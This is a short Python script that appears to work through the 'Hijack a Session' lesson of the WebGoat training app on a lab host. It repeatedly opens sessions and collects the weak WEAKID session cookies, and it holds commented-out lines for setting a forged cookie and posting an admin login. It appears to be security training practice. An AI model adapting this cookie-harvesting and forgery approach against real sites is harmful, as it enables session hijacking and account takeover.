import requests
import re
import urllib.parse

url = "http://192.168.238.142/WebGoat/attack"
login = ('root','owaspbwa')

data = {'start': 'Start WebGoat'}
find = "Hijack a Session"

while True:
    session = requests.Session()

    r1 = session.get(url, auth=login)
    r2 = session.post(url, data, auth=login)

    m = re.search("attack\?Screen=(\d+).*%s"%find, r2.text)
    if not m is None:
        scr= m.group(1)

        params = {'Screen': scr, 'menu': '1800'}
        q = urllib.parse.urlencode(params)

        nurl = f'{url}?{q}'

        # session.cookies.set('WEAKID', '11310-1592588130784')

        r3 = session.get(nurl)

        id1 = session.cookies.get_dict()['WEAKID']
        print(id1)

        data= {
            'Username': 'admin',
            'Password': 'admin'
        }

        print()
        session.close()
# r4 = session.post(nurl, data=data)

# print(r4.text)
# print(r4.cookies.get_dict())
# print(session.cookies.get_dict())
